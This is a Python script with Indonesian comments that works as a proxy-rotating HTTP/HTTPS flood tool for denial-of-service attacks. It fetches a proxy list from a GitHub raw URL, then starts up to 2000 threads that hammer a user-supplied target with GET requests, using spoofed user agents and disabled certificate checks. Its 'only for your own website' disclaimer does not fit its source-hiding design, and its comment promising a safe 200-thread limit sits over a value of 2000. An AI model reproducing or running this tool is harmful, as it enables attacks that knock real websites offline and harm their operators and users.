#!/usr/bin/env python3
"""
🔥 FLOOD + LOG SETIAP PAKET
- HTTP & HTTPS support
- Tiap proxy tampil: "IP → Paket #X sukses"
HANYA UNTUK WEBSITE MILIK SENDIRI!
"""

import socket
import threading
import time
import random
import urllib.request
import ssl
import sys
from urllib.parse import urlparse

# 🔗 RAW URL GitHub lu — HAPUS SPASI DI AKHIR!
GITHUB_PROXY_URL = "https://raw.githubusercontent.com/rapipppganzz/asoy/main/proxy.txt"

# 🎭 Custom User-Agent
CUSTOM_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
    "CustomBot/2.0 (Flood Mode)",
    "Python-urllib/3.10",
]

PATHS = ["/", "/index.html", "/login", "/api", "/wp-admin", "/?q=flood", "/contact"]

request_count = 0
lock = threading.Lock()

def log(msg):
    with lock:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def load_proxies_from_github():
    try:
        log("📥 Mengunduh daftar proxy dari GitHub...")
        with urllib.request.urlopen(GITHUB_PROXY_URL, timeout=10) as resp:
            lines = resp.read().decode('utf-8').splitlines()
        proxies = [line.strip() for line in lines if line.strip() and ":" in line]
        log(f"✅ Berhasil muat {len(proxies)} proxy.")
        return proxies
    except Exception as e:
        log(f"❌ Gagal unduh proxy: {e}")
        sys.exit(1)

# === FLOOD HTTP — LOG TIAP REQUEST ===
def flood_http(proxy, target_host, target_port, duration):
    global request_count
    try:
        proxy_host, proxy_port_str = proxy.split(":", 1)
        proxy_port = int(proxy_port_str)
    except:
        return

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((proxy_host, proxy_port))

            path = random.choice(PATHS)
            ua = random.choice(CUSTOM_UAS)
            req = (
                f"GET http://{target_host}:{target_port}{path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())
            s.recv(1024)
            s.close()

            with lock:
                request_count += 1
                log(f"📤 {proxy_host} → Paket #{request_count} sukses")
        except:
            with lock:
                log(f"❌ {proxy_host} → Gagal")

# === FLOOD HTTPS — LOG TIAP REQUEST ===
def flood_https(proxy, target_host, target_port, duration):
    global request_count
    try:
        proxy_host, proxy_port_str = proxy.split(":", 1)
        proxy_port = int(proxy_port_str)
    except:
        return

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((proxy_host, proxy_port))

            connect_req = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
            s.send(connect_req.encode())
            s.recv(4096)

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssl_sock = ctx.wrap_socket(s, server_hostname=target_host)

            path = random.choice(PATHS)
            ua = random.choice(CUSTOM_UAS)
            http_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: close\r\n\r\n"
            )
            ssl_sock.send(http_req.encode())
            ssl_sock.recv(4096)
            ssl_sock.close()

            with lock:
                request_count += 1
                log(f"📤 {proxy_host} → Paket #{request_count} sukses (HTTPS)")
        except:
            with lock:
                log(f"❌ {proxy_host} → Gagal (HTTPS)")

# === MAIN ===
def main():
    print("WELCOME RAPIPPPMODSS")
    print("=" * 50)

    target = input("Masukkan target (http:// atau https://): ").strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    parsed = urlparse(target)
    if not parsed.hostname:
        print("❌ URL tidak valid!")
        return

    host = parsed.hostname
    if target.startswith("https://"):
        use_https = True
        port = parsed.port or 443
    else:
        use_https = False
        port = parsed.port or 80

    try:
        duration = int(input("⏱️ Durasi (detik, 0 = tak terbatas): ") or "120")
    except:
        duration = 120

    proxies = load_proxies_from_github()
    if not proxies:
        return

    log(f"🎯 Target: {host}:{port} ({'HTTPS' if use_https else 'HTTP'})")
    log(f"🧷 Proxy: {len(proxies)} | Mode: {'Tak terbatas' if duration == 0 else f'{duration} detik'}")

    # 🔥 BATASI TOTAL THREAD = 200 (aman!)
    MAX_TOTAL_THREADS = 2000
    selected_proxies = random.sample(proxies, min(len(proxies), MAX_TOTAL_THREADS))
    log(f"🌀 Memilih {len(selected_proxies)} proxy aktif")

    threads = []
    for proxy in selected_proxies:
        t = threading.Thread(
            target=flood_https if use_https else flood_http,
            args=(proxy, host, port, duration if duration > 0 else 3600)
        )
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        if duration == 0:
            while True:
                time.sleep(1)
        else:
            time.sleep(duration)
        log(f"✅ Selesai. Total paket: {request_count}")
    except KeyboardInterrupt:
        log("🛑 Dihentikan oleh pengguna.")

if __name__ == "__main__":
    main()